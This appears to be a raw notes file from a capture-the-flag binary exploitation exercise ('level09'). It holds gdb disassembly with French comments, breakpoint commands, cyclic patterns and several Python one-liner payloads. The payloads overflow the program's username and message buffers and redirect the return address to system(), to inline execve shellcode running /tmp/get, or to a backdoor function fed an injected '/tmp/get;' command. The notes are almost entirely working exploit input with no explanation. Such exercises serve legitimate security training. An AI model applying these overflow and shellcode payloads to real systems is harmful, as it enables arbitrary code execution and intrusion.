
Dump of assembler code for function secret_backdoor:
   0x000000000000088c <+0>:     push   %rbp
   0x000000000000088d <+1>:     mov    %rsp,%rbp
   0x0000000000000890 <+4>:     add    $0xffffffffffffff80,%rsp
   0x0000000000000894 <+8>:     mov    0x20171d(%rip),%rax        # 0x201fb8
   0x000000000000089b <+15>:    mov    (%rax),%rax
   0x000000000000089e <+18>:    mov    %rax,%rdx
   0x00000000000008a1 <+21>:    lea    -0x80(%rbp),%rax
   0x00000000000008a5 <+25>:    mov    $0x80,%esi
   0x00000000000008aa <+30>:    mov    %rax,%rdi
   0x00000000000008ad <+33>:    callq  0x770 <fgets@plt>				; fgets
   0x00000000000008b2 <+38>:    lea    -0x80(%rbp),%rax
   0x00000000000008b6 <+42>:    mov    %rax,%rdi
   0x00000000000008b9 <+45>:    callq  0x740 <system@plt>				; system
   0x00000000000008be <+50>:    leaveq 
   0x00000000000008bf <+51>:    retq   

Dump of assembler code for function set_msg:
   0x0000000000000932 <+0>:     push   %rbp
   0x0000000000000933 <+1>:     mov    %rsp,%rbp
   0x0000000000000936 <+4>:     sub    $0x410,%rsp					; 1040
   0x000000000000093d <+11>:    mov    %rdi,-0x408(%rbp)
   0x0000000000000944 <+18>:    lea    -0x400(%rbp),%rax			; rbp-1024
   0x000000000000094b <+25>:    mov    %rax,%rsi
   0x000000000000094e <+28>:    mov    $0x0,%eax
   0x0000000000000953 <+33>:    mov    $0x80,%edx					; 128
   0x0000000000000958 <+38>:    mov    %rsi,%rdi
   0x000000000000095b <+41>:    mov    %rdx,%rcx
   0x000000000000095e <+44>:    rep stos %rax,%es:(%rdi)
   0x0000000000000961 <+47>:    lea    0x265(%rip),%rdi        # 0xbcd				; ">: Msg @Unix-Dude"
   0x0000000000000968 <+54>:    callq  0x730 <puts@plt>								; puts
   0x000000000000096d <+59>:    lea    0x26b(%rip),%rax        # 0xbdf				; ">>: "
   0x0000000000000974 <+66>:    mov    %rax,%rdi
   0x0000000000000977 <+69>:    mov    $0x0,%eax
   0x000000000000097c <+74>:    callq  0x750 <printf@plt>							; printf
   0x0000000000000981 <+79>:    mov    0x201630(%rip),%rax        # 0x201fb8		; stdin
   0x0000000000000988 <+86>:    mov    (%rax),%rax
   0x000000000000098b <+89>:    mov    %rax,%rdx
   0x000000000000098e <+92>:    lea    -0x400(%rbp),%rax							; buffer pour notre input
   0x0000000000000995 <+99>:    mov    $0x400,%esi									; 1024
   0x000000000000099a <+104>:   mov    %rax,%rdi
   0x000000000000099d <+107>:   callq  0x770 <fgets@plt>							; fgets
   0x00000000000009a2 <+112>:   mov    -0x408(%rbp),%rax
   0x00000000000009a9 <+119>:   mov    0xb4(%rax),%eax								; rax+180, (gdb: eax = 140)
   0x00000000000009af <+125>:   movslq %eax,%rdx
   0x00000000000009b2 <+128>:   lea    -0x400(%rbp),%rcx							; notre input  src
   0x00000000000009b9 <+135>:   mov    -0x408(%rbp),%rax							; "\n"         dst
   0x00000000000009c0 <+142>:   mov    %rcx,%rsi
   0x00000000000009c3 <+145>:   mov    %rax,%rdi
   0x00000000000009c6 <+148>:   callq  0x720 <strncpy@plt>							; strncpy
   0x00000000000009cb <+153>:   leaveq 
   0x00000000000009cc <+154>:   retq 

Dump of assembler code for function set_username:
   0x00000000000009cd <+0>:     push   %rbp
   0x00000000000009ce <+1>:     mov    %rsp,%rbp
   0x00000000000009d1 <+4>:     sub    $0xa0,%rsp				; 160
   0x00000000000009d8 <+11>:    mov    %rdi,-0x98(%rbp)			; rdi = addr en arg, 152
   0x00000000000009df <+18>:    lea    -0x90(%rbp),%rax			; 144
   0x00000000000009e6 <+25>:    mov    %rax,%rsi
   0x00000000000009e9 <+28>:    mov    $0x0,%eax
   0x00000000000009ee <+33>:    mov    $0x10,%edx
   0x00000000000009f3 <+38>:    mov    %rsi,%rdi
   0x00000000000009f6 <+41>:    mov    %rdx,%rcx
   0x00000000000009f9 <+44>:    rep stos %rax,%es:(%rdi)
   0x00000000000009fc <+47>:    lea    0x1e1(%rip),%rdi        # 0xbe4				; ">: Enter your username"
   0x0000000000000a03 <+54>:    callq  0x730 <puts@plt>								; puts
   0x0000000000000a08 <+59>:    lea    0x1d0(%rip),%rax        # 0xbdf				; ">>: "
   0x0000000000000a0f <+66>:    mov    %rax,%rdi
   0x0000000000000a12 <+69>:    mov    $0x0,%eax
   0x0000000000000a17 <+74>:    callq  0x750 <printf@plt>							; printf
   0x0000000000000a1c <+79>:    mov    0x201595(%rip),%rax        # 0x201fb8		; stdin
   0x0000000000000a23 <+86>:    mov    (%rax),%rax
   0x0000000000000a26 <+89>:    mov    %rax,%rdx
   0x0000000000000a29 <+92>:    lea    -0x90(%rbp),%rax
   0x0000000000000a30 <+99>:    mov    $0x80,%esi									; 128
   0x0000000000000a35 <+104>:   mov    %rax,%rdi
   0x0000000000000a38 <+107>:   callq  0x770 <fgets@plt>							; fgets
   0x0000000000000a3d <+112>:   movl   $0x0,-0x4(%rbp)
   0x0000000000000a44 <+119>:   jmp    0xa6a <set_username+157>

   0x0000000000000a46 <+121>:   mov    -0x4(%rbp),%eax
   0x0000000000000a49 <+124>:   cltq   
   0x0000000000000a4b <+126>:   movzbl -0x90(%rbp,%rax,1),%ecx
   0x0000000000000a53 <+134>:   mov    -0x98(%rbp),%rdx
   0x0000000000000a5a <+141>:   mov    -0x4(%rbp),%eax
   0x0000000000000a5d <+144>:   cltq   
   0x0000000000000a5f <+146>:   mov    %cl,0x8c(%rdx,%rax,1)
   0x0000000000000a66 <+153>:   addl   $0x1,-0x4(%rbp)

   0x0000000000000a6a <+157>:   cmpl   $0x28,-0x4(%rbp)								; 40
   0x0000000000000a6e <+161>:   jg     0xa81 <set_username+180>

   0x0000000000000a70 <+163>:   mov    -0x4(%rbp),%eax
   0x0000000000000a73 <+166>:   cltq   
   0x0000000000000a75 <+168>:   movzbl -0x90(%rbp,%rax,1),%eax
   0x0000000000000a7d <+176>:   test   %al,%al
   0x0000000000000a7f <+178>:   jne    0xa46 <set_username+121>

   0x0000000000000a81 <+180>:   mov    -0x98(%rbp),%rax
   0x0000000000000a88 <+187>:   lea    0x8c(%rax),%rdx
   0x0000000000000a8f <+194>:   lea    0x165(%rip),%rax        # 0xbfb				; ">: Welcome, %s"
   0x0000000000000a96 <+201>:   mov    %rdx,%rsi
   0x0000000000000a99 <+204>:   mov    %rax,%rdi
   0x0000000000000a9c <+207>:   mov    $0x0,%eax
   0x0000000000000aa1 <+212>:   callq  0x750 <printf@plt>							; printf
   0x0000000000000aa6 <+217>:   leaveq 
   0x0000000000000aa7 <+218>:   retq 

Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:     push   %rbp
   0x00000000000008c1 <+1>:     mov    %rsp,%rbp
   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp			; 192
   0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax
   0x00000000000008d2 <+18>:    add    $0x8c,%rax			; 140
   0x00000000000008d8 <+24>:    movq   $0x0,(%rax)
   0x00000000000008df <+31>:    movq   $0x0,0x8(%rax)		; rax+8
   0x00000000000008e7 <+39>:    movq   $0x0,0x10(%rax)		; rax+16
   0x00000000000008ef <+47>:    movq   $0x0,0x18(%rax)		; rax+24
   0x00000000000008f7 <+55>:    movq   $0x0,0x20(%rax)		; rax+32
   0x00000000000008ff <+63>:    movl   $0x8c,-0xc(%rbp)		; 140,rbp-12
   0x0000000000000906 <+70>:    lea    -0xc0(%rbp),%rax		; 0x7fffffffe510
   0x000000000000090d <+77>:    mov    %rax,%rdi
   0x0000000000000910 <+80>:    callq  0x9cd <set_username>					; set_username
   0x0000000000000915 <+85>:    lea    -0xc0(%rbp),%rax
   0x000000000000091c <+92>:    mov    %rax,%rdi
   0x000000000000091f <+95>:    callq  0x932 <set_msg>						; set_msg
   0x0000000000000924 <+100>:   lea    0x295(%rip),%rdi        # 0xbc0		; ">: Msg sent!"
   0x000000000000092b <+107>:   callq  0x730 <puts@plt>						; puts
   0x0000000000000930 <+112>:   leaveq 
   0x0000000000000931 <+113>:   retq

Dump of assembler code for function main:
   0x0000000000000aa8 <+0>:     push   %rbp
   0x0000000000000aa9 <+1>:     mov    %rsp,%rbp
   0x0000000000000aac <+4>:     lea    0x15d(%rip),%rdi        # 0xc10		; "[...]  ~Welcome to l33t-m$n ~  [...]"
   0x0000000000000ab3 <+11>:    callq  0x730 <puts@plt>						; puts
   0x0000000000000ab8 <+16>:    callq  0x8c0 <handle_msg>					; handle_msg
   0x0000000000000abd <+21>:    mov    $0x0,%eax
   0x0000000000000ac2 <+26>:    pop    %rbp
   0x0000000000000ac3 <+27>:    retq


#1 break avant strncpy pour modifier l arg3 (rdx)
b*0x00005555555549c6

#2 break avant le ret de handle_msg() pour check RETA
b*0x0000555555554930

run


#1
set $rdx = 255
p/x $rdx
c

#2
p/x $rbp+8


0x7fffffffe684

1234567890123456789012345678901234567890A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
system 0x7ffff7a61210	\x10\x12\xa6\xf7\xff\x7f
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x10\x12\xa6\xf7\xff\x7f\x00\x00"' ) | ./level09
(sleep 0.2 ; python -c 'print "A"*40 + "\xcc"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x10\x12\xa6\xf7"' ) | ./level09

(sleep 0.2 ; python -c 'print "A"*40 + "\xd7"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x10\x12\xa6\xf7" + "BBBB" + "/bin/sh"' ) | ./level09
(sleep 0.2 ; python -c 'print "A"*40 + "\xdb"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x10\x12\xa6\xf7\xff\x7f\x00\x00" + "BBBB" + "/bin/sh"' ) | ./level09


env gdb milieu des nop: 0x7fffffffe684 \x84\xe6\xff\xff\xff\x7f
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x84\xe6\xff\xff\xff\x7f\x00\x00"' ) | ./level09

dest: 0x7fffffffe510 + 80 = 0x7fffffffe560 \x60\xe5\xff\xff\xff\x7f
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"'  ; sleep 0.2 ; python -c 'print "\x90"*175 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x60\xe5\xff\xff\xff\x7f\x00\x00"' ) | ./level09
\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

secret_backdoor 0x000000000000088c
0x000055555555488c \x8c\x48\x55\x55\x55\x55\x00\x00
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"' ; sleep 0.2 ; python -c 'print "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"' ; sleep 0.2 ; python -c 'print "/tmp/get;" "A"*191 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09
(sleep 0.2 ; python -c 'print "A"*40 + "\xd0"' ; sleep 0.2 ; python -c 'print "A"*72 + "/tmp/get;" + "B"*119 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA